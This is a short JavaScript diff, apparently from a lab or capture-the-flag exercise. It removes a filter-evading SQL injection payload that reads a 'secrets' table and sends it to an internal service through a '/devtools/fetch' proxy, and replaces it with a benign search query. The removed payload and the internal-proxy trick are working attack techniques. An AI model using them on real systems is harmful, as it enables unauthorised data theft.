@@ -1,13 +1,9 @@
-// Build the SQL injection payload
-const sqlPayload = "' UnIoN SeLeCt 1,secret,3,4 FrOm secrets WheRe '1'='1";
-
-// Construct URL with proper encoding
-const url = "http://127.0.0.1:8080/search?q=" + encodeURIComponent(sqlPayload);
-
 fetch('/devtools/fetch', {
   method: 'POST',
   headers: {'Content-Type': 'application/json'},
-  body: JSON.stringify({url: url})
+  body: JSON.stringify({
+    url: "http://127.0.0.1:8080/search?q=a*"
+  })
 })
 .then(r => r.json())
 .then(d => {
